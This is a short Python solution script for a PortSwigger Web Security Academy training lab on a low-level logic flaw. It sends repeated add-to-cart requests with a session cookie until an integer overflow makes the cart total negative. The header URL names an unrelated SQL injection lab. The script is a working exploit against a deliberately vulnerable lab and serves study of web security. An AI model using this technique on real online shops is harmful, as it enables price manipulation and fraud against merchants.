# Lab: Low-level logic flaw
# URL: https://portswigger.net/web-security/sql-injection/lab-blind-time-delays
# Description: 📌 The basic idea:
    #In some languages, servers, or databases, the numbers are represented inside the memory using specific data types (InT32, INT64).This type remains a maximum limit and a minimum of value that he can store.
# Author: Abdarhman


import requests
import re 

url= 'REPLACE-YOUR-LAB/cart'

my_Cookies={ 'session':'REPLACE-YOUR-COOKIE'}

my_headers={
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'Content-Type': 'application/x-www-form-urlencoded',
'Origin':'REPLCAE-YOUR-LAB', # LAB LIKE ==> https://0a420057031792cc84a8efc7005f00ff.web-security-academy.net
'Referer': 'REPLACE-YOUR-LAB/cart',
}

my_data='productId=1&quantity=99&redir=CART'

session=requests.Session()
session.headers.update(my_headers)
session.cookies.update(my_Cookies)



for i in range(166):
    req= session.post(url,data=my_data)

    match=re.search(r'<th>Total:</th>\s*<th>(-?\$\d[\d,\.]*)</th>',req.text).group(1)

    print(f'[{i+1}] Total: {match}')

    if match.startswith('-'):
        print(f'req-Num {i+1} | Total :{match}')
        break
        

print("✅ Done!")

   
